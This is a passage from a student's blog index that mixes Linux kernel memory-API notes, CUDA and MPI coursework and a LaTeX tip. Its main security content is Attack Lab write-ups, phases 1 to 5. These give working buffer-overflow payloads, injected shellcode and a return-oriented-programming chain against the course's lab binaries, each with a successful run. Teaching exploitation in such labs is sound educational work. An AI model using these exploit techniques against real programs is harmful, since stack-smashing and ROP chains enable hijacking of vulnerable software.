*cache, const void *obj);Allocate and release a single object from the cache.Files/proc/slabinfoA virtual file containing statistics on slab cache usage.&lt;linux/mempool.h&gt;mempool_t *mempool_create(int min_nr, mempool_alloc_t *alloc_fn, mempool_free_t *free_fn, void *data);void mempool_destroy(mempool_t *pool);Functions for the creation of memory pools, which try to avoid memory allocation failures by keeping an \"emergency list\" of allocated items.void *mempool_alloc(mempool_t *pool, int gfp_mask);void mempool_free(void *element, mempool_t *pool);Functions for allocating items from (and returning them to) memory pools.unsigned long get_zeroed_page(int flags);unsigned long __get_free_page(int flags);unsigned long __get_free_pages(int flags, unsigned long order);The page-oriented allocation functions. get_zeroed_page returns a single, zero-filled page. All the other versions of the call do not initialize the contents of the returned page(s).int get_order(unsigned long size);Returns the allocation order associated to size in the current platform, according to PAGE_SIZE. The argument must be a power of two, and the return value is at least 0.void free_page(unsigned long addr);void free_pages(unsigned long addr, unsigned long order);Functions that release page-oriented allocations.struct page *alloc_pages_node(int nid, unsigned int flags, unsigned int order);struct page *alloc_pages(unsigned int flags, unsigned int order);struct page *alloc_page(unsigned int flags);All variants of the lowest-level page allocator in the Linux kernel.void __free_page(struct page *page);void __free_pages(struct page *page, unsigned int order);void free_hot_page(struct page *page);void free_cold_page(struct page *page);Various ways of freeing pages allocated with one of the forms of alloc_page.&lt;linux/vmalloc.h&gt;void * vmalloc(unsigned long size);void vfree(void * addr);&lt;asm/io.h&gt;void * ioremap(unsigned long offset, unsigned long size);void iounmap(void *addr);Functions that allocate or free a contiguous virtual address space. ioremap accesses physical memory through virtual addresses, while vmalloc allocates free pages. Regions mapped with ioremap are freed with iounmap, while pages obtained from vmalloc are released with vfree.&lt;linux/percpu.h&gt;DEFINE_PER_CPU(type, name);DECLARE_PER_CPU(type, name);Macros that define and declare per-CPU variables.per_cpu(variable, int cpu_id)get_cpu_var(variable)put_cpu_var(variable)Macros that provide access to statically declared per-CPU variables.void *alloc_percpu(type);void *__alloc_percpu(size_t size, size_t align);void free_percpu(void *variable);Functions that perform runtime allocation and freeing of per-CPU variables.int get_cpu();void put_cpu();per_cpu_ptr(void *variable, int cpu_id)get_cpu obtains a reference to the current processor (therefore, preventing preemption and movement to another processor) and returns the ID number of the processor; put_cpu returns that reference. To access a dynamically allocated per-CPU variable, use per_cpu_ptr with the ID of the CPU whose version should be accessed. Manipulations of the current CPU's version of a dynamic, per-CPU variable should probably be surrounded by calls to get_cpu and put_cpu.&lt;linux/bootmem.h&gt;void *alloc_bootmem(unsigned long size);void *alloc_bootmem_low(unsigned long size);void *alloc_bootmem_pages(unsigned long size);void *alloc_bootmem_low_pages(unsigned long size);void free_bootmem(unsigned long addr, unsigned long size);Functions (which can be used only by drivers directly linked into the kernel) that perform allocation and freeing of memory at system bootstrap time." }, { "title": "exp6: CUDA 并行策略", "url": "/course-work/introduction-to-high-performance-computing/2022/04/26/exp6-cuda-%E5%B9%B6%E8%A1%8C%E7%AD%96%E7%95%A5/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, CUDA", "date": "2022-04-26 00:00:00 +0800", "snippet": "PerformanceAnalysis当 block_size = 32 * 1 时, block_size 过小, grid 数量过多, 导致调度产生的开销过大, 因此耗时较长.在一些 block_size 取值处, 例如 block_size = 32 * 16, 32 * 21 等, naive 和 shared_memory 的性能都出现了较大幅度的跳变, 暂时想不出来为什么.Shared Memory 带来的提升, 主要是通过增加内存访问时间以及 __syncthreads 开销, 以减少对同一元素重复调用 calc 方法. 当 block_size 较小时, __syncthreads 的开销较小, 因此 Shared Memory 能够带来一定的提升. 但随着 block_size 的增大, 同步的开销逐步增加, 导致 Shared Memory 带来的提升不明显, 甚至产生了负面影响.事实上, 使用 Shared Memory 的实现对于每个 Thread 而言负载极不均衡. 位于边界的 Thread 需要进行数次 calc, 而位于 Block 内部的 Thread 只需要进行一次计算. 负载分配策略仍有优化空间. 除此之外, Shared Memory 实现使用了多次 if, 这也可能带来性能的损耗.不难看出, Shared Memory 往往伴随着线程同步一起使用. 对于 CPU Bound 类型的程序, 通过划分较小的 block_size, 并使用 Shared Memory 优化, 应该能够有效提升程序性能. 而对于 Memory Bound 类型的程序, 使用 Shared Memory 减少重复计算显然得不偿失. 这时, Shared Memory 可能并不能带来性能的提升, 反而因为 Shared Memory 的访问速度限制使得程序性能更加糟糕." }, { "title": "Attack Lab: Phase 5", "url": "/course-work/computer-organization-and-architecture/2022/04/23/phase-5/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Attack Lab", "date": "2022-04-23 00:00:00 +0800", "snippet": "Runobjdump --disassemble rtarget &gt; rtarget.asmRead File rtarget.asm...0000000000401c78 &lt;touch3&gt;:...0000000000401d0f &lt;start_farm&gt;: 401d0f:\tb8 01 00 00 00 \tmov $0x1,%eax 401d14:\tc3 \tretq0000000000401d15 &lt;addval_420&gt;: 401d15:\t8d 87 48 89 c7 94 \tlea -0x6b3876b8(%rdi),%eax 401d1b:\tc3 \tretq0000000000401d1c &lt;setval_146&gt;: 401d1c:\tc7 07 58 92 90 90 \tmovl $0x90909258,(%rdi) 401d22:\tc3 \tretq0000000000401d23 &lt;addval_451&gt;: 401d23:\t8d 87 00 58 c3 1c \tlea 0x1cc35800(%rdi),%eax 401d29:\tc3 \tretq0000000000401d2a &lt;addval_158&gt;: 401d2a:\t8d 87 48 89 c7 c3 \tlea -0x3c3876b8(%rdi),%eax 401d30:\tc3 \tretq0000000000401d31 &lt;setval_387&gt;: 401d31:\tc7 07 58 c3 08 57 \tmovl $0x5708c358,(%rdi) 401d37:\tc3 \tretq0000000000401d38 &lt;getval_439&gt;: 401d38:\tb8 48 89 c7 c3 \tmov $0xc3c78948,%eax 401d3d:\tc3 \tretq0000000000401d3e &lt;getval_205&gt;: 401d3e:\tb8 b7 d7 58 c2 \tmov $0xc258d7b7,%eax 401d43:\tc3 \tretq0000000000401d44 &lt;setval_398&gt;: 401d44:\tc7 07 48 89 c7 c7 \tmovl $0xc7c78948,(%rdi) 401d4a:\tc3 \tretq0000000000401d4b &lt;mid_farm&gt;: 401d4b:\tb8 01 00 00 00 \tmov $0x1,%eax 401d50:\tc3 \tretq0000000000401d51 &lt;add_xy&gt;: 401d51:\t48 8d 04 37 \tlea (%rdi,%rsi,1),%rax 401d55:\tc3 \tretq0000000000401d56 &lt;getval_493&gt;: 401d56:\tb8 89 c1 08 d2 \tmov $0xd208c189,%eax 401d5b:\tc3 \tretq0000000000401d5c &lt;getval_480&gt;: 401d5c:\tb8 89 d6 08 db \tmov $0xdb08d689,%eax 401d61:\tc3 \tretq0000000000401d62 &lt;getval_269&gt;: 401d62:\tb8 89 ca 60 c9 \tmov $0xc960ca89,%eax 401d67:\tc3 \tretq0000000000401d68 &lt;getval_133&gt;: 401d68:\tb8 5e 48 88 e0 \tmov $0xe088485e,%eax 401d6d:\tc3 \tretq0000000000401d6e &lt;addval_307&gt;: 401d6e:\t8d 87 99 c1 20 c9 \tlea -0x36df3e67(%rdi),%eax 401d74:\tc3 \tretq0000000000401d75 &lt;addval_127&gt;: 401d75:\t8d 87 81 d6 84 d2 \tlea -0x2d7b297f(%rdi),%eax 401d7b:\tc3 \tretq0000000000401d7c &lt;addval_116&gt;: 401d7c:\t8d 87 89 c1 90 90 \tlea -0x6f6f3e77(%rdi),%eax 401d82:\tc3 \tretq0000000000401d83 &lt;addval_120&gt;: 401d83:\t8d 87 2e 48 88 e0 \tlea -0x1f77b7d2(%rdi),%eax 401d89:\tc3 \tretq0000000000401d8a &lt;getval_260&gt;: 401d8a:\tb8 a9 d6 20 c0 \tmov $0xc020d6a9,%eax 401d8f:\tc3 \tretq0000000000401d90 &lt;getval_400&gt;: 401d90:\tb8 48 89 e0 c3 \tmov $0xc3e08948,%eax 401d95:\tc3 \tretq0000000000401d96 &lt;addval_196&gt;: 401d96:\t8d 87 c9 c1 20 db \tlea -0x24df3e37(%rdi),%eax 401d9c:\tc3 \tretq0000000000401d9d &lt;setval_327&gt;: 401d9d:\tc7 07 89 c1 00 d2 \tmovl $0xd200c189,(%rdi) 401da3:\tc3 \tretq0000000000401da4 &lt;getval_253&gt;: 401da4:\tb8 89 d6 00 db \tmov $0xdb00d689,%eax 401da9:\tc3 \tretq0000000000401daa &lt;setval_300&gt;: 401daa:\tc7 07 81 c1 20 c0 \tmovl $0xc020c181,(%rdi) 401db0:\tc3 \tretq0000000000401db1 &lt;getval_176&gt;: 401db1:\tb8 48 89 e0 94 \tmov $0x94e08948,%eax 401db6:\tc3 \tretq0000000000401db7 &lt;setval_430&gt;: 401db7:\tc7 07 4a 09 ca 90 \tmovl $0x90ca094a,(%rdi) 401dbd:\tc3 \tretq0000000000401dbe &lt;getval_168&gt;: 401dbe:\tb8 89 ca 20 db \tmov $0xdb20ca89,%eax 401dc3:\tc3 \tretq0000000000401dc4 &lt;getval_337&gt;: 401dc4:\tb8 89 ca 28 db \tmov $0xdb28ca89,%eax 401dc9:\tc3 \tretq0000000000401dca &lt;setval_190&gt;: 401dca:\tc7 07 c9 c1 84 db \tmovl $0xdb84c1c9,(%rdi) 401dd0:\tc3 \tretq0000000000401dd1 &lt;addval_479&gt;: 401dd1:\t8d 87 89 d6 90 c3 \tlea -0x3c6f2977(%rdi),%eax 401dd7:\tc3 \tretq0000000000401dd8 &lt;getval_448&gt;: 401dd8:\tb8 89 ca c3 99 \tmov $0x99c3ca89,%eax 401ddd:\tc3 \tretq0000000000401dde &lt;addval_105&gt;: 401dde:\t8d 87 48 89 e0 92 \tlea -0x6d1f76b8(%rdi),%eax 401de4:\tc3 \tretq0000000000401de5 &lt;getval_267&gt;: 401de5:\tb8 b2 48 89 e0 \tmov $0xe08948b2,%eax 401dea:\tc3 \tretq0000000000401deb &lt;getval_311&gt;: 401deb:\tb8 09 d6 90 c3 \tmov $0xc390d609,%eax 401df0:\tc3 \tretq0000000000401df1 &lt;addval_404&gt;: 401df1:\t8d 87 48 8b e0 c3 \tlea -0x3c1f74b8(%rdi),%eax 401df7:\tc3 \tretq0000000000401df8 &lt;setval_115&gt;: 401df8:\tc7 07 a9 d6 08 c0 \tmovl $0xc008d6a9,(%rdi) 401dfe:\tc3 \tretq0000000000401dff &lt;addval_306&gt;: 401dff:\t8d 87 99 ca 20 d2 \tlea -0x2ddf3567(%rdi),%eax 401e05:\tc3 \tretq0000000000401e06 &lt;addval_170&gt;: 401e06:\t8d 87 48 89 e0 94 \tlea -0x6b1f76b8(%rdi),%eax 401e0c:\tc3 \tretq0000000000401e0d &lt;addval_257&gt;: 401e0d:\t8d 87 89 c1 18 db \tlea -0x24e73e77(%rdi),%eax 401e13:\tc3 \tretq0000000000401e14 &lt;addval_325&gt;: 401e14:\t8d 87 8d ca 08 c9 \tlea -0x36f73573(%rdi),%eax 401e1a:\tc3 \tretq0000000000401e1b &lt;getval_109&gt;: 401e1b:\tb8 99 d6 84 c9 \tmov $0xc984d699,%eax 401e20:\tc3 \tretq0000000000401e21 &lt;setval_488&gt;: 401e21:\tc7 07 a1 a9 ca 90 \tmovl $0x90caa9a1,(%rdi) 401e27:\tc3 \tretq0000000000401e28 &lt;end_farm&gt;:...Design Gadget48 89 e0 movq %rsp, %rax48 89 c7 movq %rax, %rdi58 popq %rax89 c1 movl %eax, %ecx89 ca movl %ecx, %edx89 d6 movl %edx, %esi48 8d 04 37 lea (%rdi,%rsi,1),%rax48 89 c7 movq %rax, %rdiSearch Gadget in rtarget.asm0000000000401d90 &lt;getval_400&gt;: 401d90:\tb8 48 89 e0 c3 \tmov $0xc3e08948,%eax 401d95:\tc3 \tretq0000000000401d2a &lt;addval_158&gt;: 401d2a:\t8d 87 48 89 c7 c3 \tlea -0x3c3876b8(%rdi),%eax 401d30:\tc3 \tretq0000000000401d23 &lt;addval_451&gt;: 401d23:\t8d 87 00 58 c3 1c \tlea 0x1cc35800(%rdi),%eax 401d29:\tc3 \tretq0000000000401d7c &lt;addval_116&gt;: 401d7c:\t8d 87 89 c1 90 90 \tlea -0x6f6f3e77(%rdi),%eax 401d82:\tc3 \tretq0000000000401dd8 &lt;getval_448&gt;: 401dd8:\tb8 89 ca c3 99 \tmov $0x99c3ca89,%eax 401ddd:\tc3 \tretq0000000000401dd1 &lt;addval_479&gt;: 401dd1:\t8d 87 89 d6 90 c3 \tlea -0x3c6f2977(%rdi),%eax 401dd7:\tc3 \tretq0000000000401d51 &lt;add_xy&gt;: 401d51:\t48 8d 04 37 \tlea (%rdi,%rsi,1),%rax 401d55:\tc3 \tretq0000000000401d2a &lt;addval_158&gt;: 401d2a:\t8d 87 48 89 c7 c3 \tlea -0x3c3876b8(%rdi),%eax 401d30:\tc3 \tretqDesign ROP0000000000401d91: 48 89 e0 c3 movq %rsp, %rax0000000000401d2c: 48 89 c7 c3 movq %rax, %rdi0000000000401d26: 58 c3 popq %rax0000000000401d7e: 89 c1 90 90 c3 movl %eax, %ecx0000000000401dd9: 89 ca c3 movl %ecx, %edx0000000000401dd3: 89 d6 movl %edx, %esi0000000000401d51: 48 8d 04 37 c3 lea (%rdi,%rsi,1),%rax0000000000401d2c: 48 89 c7 movq %rax, %rdi0000000000401c78: &lt;touch3&gt;Read File cookie.txt0x3a9a6c2fConvert Cookie to StringThe string should end with a \\0.33 61 39 61 36 63 32 66 00Write File phase-5.txt00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0091 1d 40 00 00 00 00 002c 1d 40 00 00 00 00 0026 1d 40 00 00 00 00 0048 00 00 00 00 00 00 007e 1d 40 00 00 00 00 00d9 1d 40 00 00 00 00 00d3 1d 40 00 00 00 00 0051 1d 40 00 00 00 00 002c 1d 40 00 00 00 00 0078 1c 40 00 00 00 00 0033 61 39 61 36 63 32 66 00Run./hex2raw &lt; phase-5.txt &gt; phase-5.in./rtarget -i phase-5.inTerminal OutputCookie: 0x3a9a6c2fTouch3!: You called touch3(\"3a9a6c2f\")Valid solution for level 3 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB!" }, { "title": "Attack Lab: Phase 4", "url": "/course-work/computer-organization-and-architecture/2022/04/23/phase-4/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Attack Lab", "date": "2022-04-23 00:00:00 +0800", "snippet": "Runobjdump --disassemble rtarget &gt; rtarget.asmRead File rtarget.asm...0000000000401b6a &lt;touch2&gt;:...0000000000401d0f &lt;start_farm&gt;: 401d0f:\tb8 01 00 00 00 \tmov $0x1,%eax 401d14:\tc3 \tretq0000000000401d15 &lt;addval_420&gt;: 401d15:\t8d 87 48 89 c7 94 \tlea -0x6b3876b8(%rdi),%eax 401d1b:\tc3 \tretq0000000000401d1c &lt;setval_146&gt;: 401d1c:\tc7 07 58 92 90 90 \tmovl $0x90909258,(%rdi) 401d22:\tc3 \tretq0000000000401d23 &lt;addval_451&gt;: 401d23:\t8d 87 00 58 c3 1c \tlea 0x1cc35800(%rdi),%eax 401d29:\tc3 \tretq0000000000401d2a &lt;addval_158&gt;: 401d2a:\t8d 87 48 89 c7 c3 \tlea -0x3c3876b8(%rdi),%eax 401d30:\tc3 \tretq0000000000401d31 &lt;setval_387&gt;: 401d31:\tc7 07 58 c3 08 57 \tmovl $0x5708c358,(%rdi) 401d37:\tc3 \tretq0000000000401d38 &lt;getval_439&gt;: 401d38:\tb8 48 89 c7 c3 \tmov $0xc3c78948,%eax 401d3d:\tc3 \tretq0000000000401d3e &lt;getval_205&gt;: 401d3e:\tb8 b7 d7 58 c2 \tmov $0xc258d7b7,%eax 401d43:\tc3 \tretq0000000000401d44 &lt;setval_398&gt;: 401d44:\tc7 07 48 89 c7 c7 \tmovl $0xc7c78948,(%rdi) 401d4a:\tc3 \tretq0000000000401d4b &lt;mid_farm&gt;:...Design Gadget58 popq %raxc3 ret48 89 c7 movq %rax, %rdic3 retSearch Gadget in rtarget.asm0000000000401d23 &lt;addval_451&gt;: 401d23:\t8d 87 00 58 c3 1c \tlea 0x1cc35800(%rdi),%eax 401d29:\tc3 \tretq0000000000401d2a &lt;addval_158&gt;: 401d2a:\t8d 87 48 89 c7 c3 \tlea -0x3c3876b8(%rdi),%eax 401d30:\tc3 \tretqRead File cookie.txt0x3a9a6c2fWrite File phase-4.txt00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0026 1d 40 00 00 00 00 002f 6c 9a 3a 00 00 00 002c 1d 40 00 00 00 00 006a 1b 40 00 00 00 00 00Run./hex2raw &lt; phase-4.txt &gt; phase-4.in./rtarget -i phase-4.inTerminal OutputCookie: 0x3a9a6c2fTouch2!: You called touch2(0x3a9a6c2f)Valid solution for level 2 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB!" }, { "title": "Attack Lab: Phase 3", "url": "/course-work/computer-organization-and-architecture/2022/04/23/phase-3/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Attack Lab", "date": "2022-04-23 00:00:00 +0800", "snippet": "Run$ gdb ctarget --tui...(gdb) break getbufBreakpoint 1 at 0x401b28: file buf.c, line 12.(gdb) run -qStarting program: /home/stu2020012872/3-lab-3-attacklab/target97/ctarget -qBreakpoint 1, getbuf () at buf.c:12(gdb) info registers rsprsp 0x55668cc0 0x55668cc0Runobjdump --disassemble ctarget &gt; ctarget.asmRead File ctarget.asm...0000000000401b28 &lt;getbuf&gt;: 401b28:\t48 83 ec 28 \tsub $0x28,%rsp...0000000000401c78 &lt;touch3&gt;:...Write File phase-3-inject.smovq $0x55668cc8, %rdipushq $0x0000000000401c78retRungcc -c phase-3-inject.sobjdump --disassemble phase-3-inject.o &gt; phase-3-inject.asmRead File phase-3-inject.asm...0000000000000000 &lt;.text&gt;: 0:\t48 c7 c7 c8 8c 66 55 \tmov $0x55668cc8,%rdi 7:\t68 78 1c 40 00 \tpushq $0x401c78 c:\tc3 \tretqRead File cookie.txt0x3a9a6c2fConvert Cookie to StringThe string should end with a \\0.33 61 39 61 36 63 32 66 00Write File phase-3.txtPlace the string in the parent frame of getbuf, that is, test stack frames.48 c7 c7 c8 8c 66 5568 78 1c 40 00c300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0098 8c 66 55 00 00 00 0033 61 39 61 36 63 32 66 00Run./hex2raw &lt; phase-3.txt &gt; phase-3.in./ctarget -i phase-3.inTerminal OutputCookie: 0x3a9a6c2fTouch3!: You called touch3(\"3a9a6c2f\")Valid solution for level 3 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB!" }, { "title": "Attack Lab: Phase 2", "url": "/course-work/computer-organization-and-architecture/2022/04/23/phase-2/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Attack Lab", "date": "2022-04-23 00:00:00 +0800", "snippet": "Runobjdump --disassemble ctarget &gt; ctarget.asmRead File cookie.txt0x3a9a6c2fRead File ctarget.asm...0000000000401b28 &lt;getbuf&gt;: 401b28:\t48 83 ec 28 \tsub $0x28,%rsp...0000000000401b6a &lt;touch2&gt;:...Write File phase-2-inject.smovl $0x3a9a6c2f, %edipushq $0x0000000000401b6aretqRungcc -c phase-2-inject.sobjdump --disassemble phase-2-inject.o &gt; phase-2-inject.asmRead File phase-2-inject.asm...0000000000000000 &lt;.text&gt;: 0:\tbf 2f 6c 9a 3a \tmov $0x3a9a6c2f,%edi 5:\t68 6a 1b 40 00 \tpushq $0x401b6a a:\tc3 \tretqRun$ gdb ctarget --tui...(gdb) break getbufBreakpoint 1 at 0x401b28: file buf.c, line 12.(gdb) run -qStarting program: /home/stu2020012872/3-lab-3-attacklab/target97/ctarget -qBreakpoint 1, getbuf () at buf.c:12(gdb) stepi(gdb) info registers rsprsp 0x55668c98 0x55668c98Write File phase-2.txtbf 2f 6c 9a 3a68 6a 1b 40 00c300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0098 8c 66 55 00 00 00 00Run./hex2raw &lt; phase-2.txt &gt; phase-2.in./ctarget -i phase-2.inTerminal OutputCookie: 0x3a9a6c2fTouch2!: You called touch2(0x3a9a6c2f)Valid solution for level 2 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB!" }, { "title": "Attack Lab: Phase 1", "url": "/course-work/computer-organization-and-architecture/2022/04/23/phase-1/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Attack Lab", "date": "2022-04-23 00:00:00 +0800", "snippet": "Runobjdump --disassemble ctarget &gt; ctarget.asmRead File ctarget.asm...0000000000401b28 &lt;getbuf&gt;: 401b28:\t48 83 ec 28 \tsub $0x28,%rsp...0000000000401b3e &lt;touch1&gt;:...Write File phase-1.txt00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 003e 1b 40 00 00 00 00 00Run./hex2raw &lt; phase-1.txt &gt; phase-1.in./ctarget -i phase-1.inTerminal OutputCookie: 0x3a9a6c2fTouch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB!" }, { "title": "How To Use More Than 10 Columns in Matrix", "url": "/latex/2022/04/10/how-to-use-more-than-10-columns-in-matrix/", "categories": "LaTeX", "tags": "untagged", "date": "2022-04-10 00:00:00 +0800", "snippet": "\\begin{bmatrix} v_1 &amp; 1 &amp; 1 &amp; 1 &amp; &amp; &amp; &amp; &amp; &amp; &amp; \\\\ v_2 &amp; -1 &amp; &amp; &amp; 1 &amp; 1 &amp; &amp; &amp; -1 &amp; &amp; \\\\ v_3 &amp; &amp; &amp; &amp; -1 &amp; &amp; 1 &amp; -1 &amp; &amp; -1 &amp; \\\\ v_4 &amp; &amp; -1 &amp; &amp; &amp; &amp; -1 &amp; 1 &amp; &amp; &amp; -1 \\\\ v_5 &amp; &amp; &amp; -1 &amp; &amp; -1 &amp; &amp; &amp; 1 &amp; 1 &amp; 1 \\\\\\end{bmatrix}ProblemExtra alignment tab has been changed to \\cr.&lt;recently read&gt; \\endtemplate Solution1\\setcounter{MaxMatrixCols}{20} % enables you to use 20 columns\\begin{bmatrix} v_1 &amp; 1 &amp; 1 &amp; 1 &amp; &amp; &amp; &amp; &amp; &amp; &amp; \\\\ v_2 &amp; -1 &amp; &amp; &amp; 1 &amp; 1 &amp; &amp; &amp; -1 &amp; &amp; \\\\ v_3 &amp; &amp; &amp; &amp; -1 &amp; &amp; 1 &amp; -1 &amp; &amp; -1 &amp; \\\\ v_4 &amp; &amp; -1 &amp; &amp; &amp; &amp; -1 &amp; 1 &amp; &amp; &amp; -1 \\\\ v_5 &amp; &amp; &amp; -1 &amp; &amp; -1 &amp; &amp; &amp; 1 &amp; 1 &amp; 1 \\\\\\end{bmatrix}Reference https://tex.stackexchange.com/questions/3519/how-to-use-more-than-10-tab-stops-in-bmatrix-or-other-amsmath-matrix-environment &#8617; " }, { "title": "PA1: 奇偶排序（odd_even_sort）", "url": "/course-work/introduction-to-high-performance-computing/2022/04/10/pa1-odd_even_sort/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, MPI", "date": "2022-04-10 00:00:00 +0800", "snippet": "Performance Number of Nodes Number of Tasks Number Count v0 v1 v2 v3 v4 1 1 100000000 1. 1. 1. 1. 1. 1 2 100000000 1.82738226 1.83557525 1.8772568 1.86270894 1.67925379 1 4 100000000 3.05696721 3.17540441 3.37059297 3.39672385 2.3387731 1 8 100000000 5.15212684 5.59405831 6.03427353 6.15270254 3.29768106 1 16 100000000 7.65590815 8.91877194 9.65970998 10.31895407 4.39598177 2 32 100000000 10.63745468 12.91174115 14.70125847 15.67950831 5.01147717 v0AllReduceBitwiseAnd + Blocking Communication + Naive Merge每轮归并后 AllReduce 检查是否已为有序.AllReduceBitwiseAnd0 -&gt; 1 -&gt; ... -&gt; (nprocs - 1) -&gt; 0 # Tag 10 -&gt; 1 -&gt; ... -&gt; (nprocs - 2) # Tag 2Source Code// odd_even_sort.cpp#include &lt;mpi.h&gt;#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include \"worker.h\"size_t CalcBlockLen(const size_t n, const int nprocs, const int rank) { if (rank &lt; 0) return 0; size_t block_size = ceiling(n, nprocs); size_t IO_offset = block_size * rank; bool out_of_range = IO_offset &gt;= n; return out_of_range ? 0 : std::min(block_size, n - IO_offset);}int AllReduceBitwiseAnd(int sendbuf, MPI_Comm comm, const int nprocs, const int current_rank) { if (nprocs == 1) return sendbuf; int succ_rank = (current_rank + 1) % nprocs; int pred_rank = (current_rank - 1 + nprocs) % nprocs; if (current_rank == 0) { MPI_Send(/*buf=*/&amp;sendbuf, /*count=*/1, /*datatype=*/MPI_INT, /*dest=*/succ_rank, /*tag=*/1, /*comm=*/comm); MPI_Recv(/*buf=*/&amp;sendbuf, /*count=*/1, /*datatype=*/MPI_INT, /*source=*/pred_rank, /*tag=*/1, /*comm=*/comm, /*status=*/nullptr); if (succ_rank != nprocs - 1) MPI_Send(/*buf=*/&amp;sendbuf, /*count=*/1, /*datatype=*/MPI_INT, /*dest=*/succ_rank, /*tag=*/2, /*comm=*/comm); } else { bool recvbuf; MPI_Recv(/*buf=*/&amp;recvbuf, /*count=*/1, /*datatype=*/MPI_INT, /*source=*/pred_rank, /*tag=*/1, /*comm=*/comm, /*status=*/nullptr); sendbuf &amp;= recvbuf; MPI_Send(/*buf=*/&amp;sendbuf, /*count=*/1, /*datatype=*/MPI_INT, /*dest=*/succ_rank, /*tag=*/1, /*comm=*/comm); if (current_rank != nprocs - 1) { MPI_Recv(/*buf=*/&amp;sendbuf, /*count=*/1, /*datatype=*/MPI_INT, /*source=*/pred_rank, /*tag=*/2, /*comm=*/comm, /*status=*/nullptr); if (succ_rank != nprocs - 1) MPI_Send(/*buf=*/&amp;sendbuf, /*count=*/1, /*datatype=*/MPI_INT, /*dest=*/succ_rank, /*tag=*/2, /*comm=*/comm); } } return sendbuf;}void Worker::sort() { if (this-&gt;out_of_range) return; std::sort(this-&gt;data, this-&gt;data + this-&gt;block_len); if (this-&gt;nprocs == 1) return; int left_rank = ((this-&gt;rank == 0) ? (-1) : (this-&gt;rank - 1)); size_t left_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, left_rank); int right_rank = ((this-&gt;rank + 1 == this-&gt;nprocs) ? (-1) : (this-&gt;rank + 1)); size_t right_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, right_rank); float* neighbor_data = new float[std::max(left_block_len, right_block_len)]; float* merged_data = new float[this-&gt;block_len]; bool sorted = false; for (int i = 0;; ++i) { if ((i &amp; 1) == 0) { // even stage if (AllReduceBitwiseAnd(sorted, MPI_COMM_WORLD, this-&gt;nprocs, this-&gt;rank)) break; sorted = false; } int neighbor_rank = 0; size_t neighbor_block_len = 0; if ((i &amp; 1) ^ ((this-&gt;rank) &amp; 1)) { neighbor_rank = right_rank; neighbor_block_len = right_block_len; } else { neighbor_rank = left_rank; neighbor_block_len = left_block_len; } if (neighbor_block_len == 0) { // no neighbor sorted = true; continue; } MPI_Status status; if (neighbor_rank == left_rank) { MPI_Sendrecv(/*sendbuf=*/this-&gt;data, /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/neighbor_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/neighbor_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); if (neighbor_data[0] &lt;= this-&gt;data[0]) { // no need to merge sorted = true; continue; } } else { // neighbor_rank == right_rank MPI_Sendrecv(/*sendbuf=*/this-&gt;data + (this-&gt;block_len - 1), /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/neighbor_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/neighbor_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); if (this-&gt;data[this-&gt;block_len - 1] &lt;= neighbor_data[0]) { // no need to merge sorted = true; continue; } } MPI_Sendrecv(/*sendbuf=*/this-&gt;data, /*sendcount=*/this-&gt;block_len, /*sendtype=*/MPI_FLOAT, /*dest=*/neighbor_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/neighbor_block_len, /*recvtype=*/MPI_FLOAT, /*source=*/neighbor_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); size_t skip_count = (neighbor_rank == left_rank) ? neighbor_block_len : 0; size_t j = 0, k = 0, l = 0; while (j &lt; neighbor_block_len &amp;&amp; k &lt; this-&gt;block_len &amp;&amp; l &lt; skip_count) { if (neighbor_data[j] &lt; this-&gt;data[k]) { ++j; ++l; } else { ++k; ++l; } } while (j &lt; neighbor_block_len &amp;&amp; l &lt; skip_count) { ++j; ++l; } while (k &lt; this-&gt;block_len &amp;&amp; l &lt; skip_count) { ++k; ++l; } l = 0; while (j &lt; neighbor_block_len &amp;&amp; k &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) { if (neighbor_data[j] &lt; this-&gt;data[k]) { merged_data[l++] = neighbor_data[j++]; } else { merged_data[l++] = this-&gt;data[k++]; } } while (j &lt; neighbor_block_len &amp;&amp; l &lt; this-&gt;block_len) merged_data[l++] = neighbor_data[j++]; while (k &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) merged_data[l++] = this-&gt;data[k++]; std::memcpy(this-&gt;data, merged_data, (this-&gt;block_len) * sizeof(float)); } delete[] neighbor_data; delete[] merged_data;}Performance Number of Nodes Number of Tasks Number Count 